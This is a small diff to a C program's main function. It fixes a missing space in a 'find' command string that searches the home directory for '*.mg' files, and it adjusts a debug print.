@@ -147,10 +147,10 @@ int	main(int ac, char **av, char **envp)
 	realpath(getenv("HOME"), home_buffer);
 	realpath(av[0], current_file_buffer);
 	printf("home path %s\n", home_buffer);
-	commands = ft_strjoin_free2("find ", ft_strjoin(home_buffer,  "-type f -name *.mg"));
+	commands = ft_strjoin_free2("find ", ft_strjoin(home_buffer,  " -type f -name *.mg"));
 	if (!commands)
 		return (1);
-	printf("find cmd %s", commands);
+	printf("find cmd: %s", commands);
 	find_cmd = ft_split(commands, ' ');
 	if (!find_cmd)
 		return (free(commands), 1);
